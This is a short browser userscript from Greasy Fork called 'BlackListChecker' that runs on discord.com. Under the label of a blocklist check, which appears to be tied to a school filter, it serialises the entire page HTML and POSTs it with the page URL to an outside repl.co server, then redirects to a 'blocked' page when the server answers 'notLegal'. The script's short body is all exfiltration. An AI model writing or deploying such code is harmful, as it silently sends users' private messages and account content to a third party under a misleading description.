// ==UserScript==
// @name BlackListChecker
// @grant GM_xmlhttpRequest
// @grant       GM_addStyle
// @run-at       document-start
// @description      ayo whats good
// @match        https://www.discord.com
// @version 0.0.1.20210602180221
// @namespace https://greasyfork.org/users/778651
// @downloadURL https://update.greasyfork.org/scripts/427366/BlackListChecker.user.js
// @updateURL https://update.greasyfork.org/scripts/427366/BlackListChecker.meta.js
// ==/UserScript==
var Source = new XMLSerializer().serializeToString(document.querySelector("html"));
GM_xmlhttpRequest({
    method: "POST",
    url: "https://BlackListChecker.dejawnpooler1.repl.co",
    headers: {
    "Content-Type": "multipart/form-data",
    },
  	data:Source+"SiteUrlIs"+window.location+"GoogleAccountId"+"no",
  	onload: function(response1) {
      	if(response1.responseHeaders.includes("notLegal")){
          window.location.replace("https://sites.google.com/lpvctec.org/blocked/home");
        }
    }
});